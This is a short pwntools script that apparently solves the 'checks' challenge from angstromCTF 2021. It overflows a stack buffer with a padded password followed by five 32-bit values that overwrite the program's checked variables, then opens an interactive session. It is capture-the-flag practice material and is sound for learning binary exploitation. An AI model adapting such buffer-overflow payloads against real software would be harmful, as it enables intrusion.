from pwn import *

e = ELF("./checks")

context.binary = e
# context.terminal = ["konsole", "-e"]

p = process([e.path])
# p = remote("pwn.2021.chall.actf.co", 21810)

#context.log_level="debug"
# gdb.attach(p)


p.sendlineafter(":", b"password123\x00".ljust(64+4*3) + p32(17)+p32(61)+p32(245)+p32(55)+p32(50))

p.interactive()
